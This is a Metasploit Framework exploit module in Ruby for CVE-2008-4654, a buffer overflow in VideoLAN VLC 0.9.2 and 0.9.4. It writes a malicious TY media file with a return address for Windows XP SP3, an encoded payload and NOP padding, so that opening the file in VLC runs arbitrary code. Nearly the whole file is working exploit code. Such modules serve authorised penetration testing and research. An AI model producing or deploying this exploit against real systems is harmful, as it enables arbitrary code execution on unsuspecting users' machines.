##
# $Id: videolan_tivo.rb 11701 2011-02-02 21:47:02Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VideoLAN VLC TiVo Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in VideoLAN VLC 0.9.4.
				By creating a malicious TY file, a remote attacker could overflow a
				buffer and execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'MC',
			'Version'        => '$Revision: 11701 $',
			'References'     =>
				[
					[ 'CVE', '2008-4654' ],
					[ 'OSVDB', '49181' ],
					[ 'BID', '31813' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# From /misc/ version
					#[ 'VideoLAN VLC 0.9.4', { 'Ret' => 0x6a5e6710 } ],
					#[ 'VideoLAN VLC 0.9.2', { 'Ret' => 0x6a5e69d7 } ],
					[ 'VideoLAN VLC 0.9.4 (XP SP3 English)', { 'Ret' => 0x6a575cad } ],
					[ 'VideoLAN VLC 0.9.2 (XP SP3 English)', { 'Ret' => 0x65473351 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 22 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.ty']),
			], self.class)
	end

	def exploit

		ty =  "\xF5\x46\x7A\xBD"
		ty << "\x00\x00\x00\x02"
		ty << "\x00\x02\x00\x00"
		ty << "\x00" * 8
		ty << "\x00\x00\x05\x41"
		ty << "\x00" * 4
		ty << "\x00\x00\x05\x49"
		ty << "\x00" * 60
		# From /misc/ version
		#ty << "\x00" * (1024 - payload.encoded.length) + payload.encoded
		#ty << make_nops(2) + Rex::Arch::X86.jmp_short(6) + [target.ret].pack('V')
		#ty << make_nops(12) + [0xe8, -525].pack('CV') + "\x00" * (129931)
		ty << [target.ret].pack('V') + payload.encoded + make_nops(12)
		ty << "\x00" * (130980 - 4 - payload.encoded.length - 12)
		ty << "\x05"
		ty << "\x00" * 3
		ty << "\x05"
		ty << "\x00" * 1
		ty << "\x09"
		ty << "\xc0"
		ty << "\x00" * 14
		ty << "\x06"
		ty << "\xe0"
		ty << "\x00" * 302004

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(ty)

	end

end